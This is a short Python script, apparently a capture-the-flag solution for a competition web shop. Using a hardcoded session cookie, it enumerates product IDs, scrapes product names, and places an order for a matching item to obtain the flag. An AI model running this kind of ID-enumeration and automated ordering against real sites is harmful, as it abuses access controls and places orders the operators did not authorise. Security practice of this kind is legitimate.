import requests
from bs4 import BeautifulSoup

cookies = {'JSESSIONID': 'C6F1E3801A6A2766CC7935304E5DDD3D'}
headers = {'User-Agent': 'Mozilla/5.0'}

keywords = ['paint', 'draw', 'art', 'color', 'brush', 'pen', 'pencil']

for pid in range(1, 500):
    url = f"http://buyalicething.secathon2025-env.net/product/view?id={pid}"
    res = requests.get(url, cookies=cookies, headers=headers)
    soup = BeautifulSoup(res.text, 'html.parser')
    tds = soup.find_all("td")
    if len(tds) >= 2:
        name = tds[0].text.strip().lower()
        if any(kw in name for kw in keywords):
            print(f"[+] FOUND: {name} at ID {pid} — trying to buy 3 units...")
            order = requests.post("http://buyalicething.secathon2025-env.net/order/cart",
                                  data={"id": str(pid), "quantity": "3"},
                                  cookies=cookies, headers=headers)
            print("[+] Placed order. Go check /order/cart to get the flag.")
            break

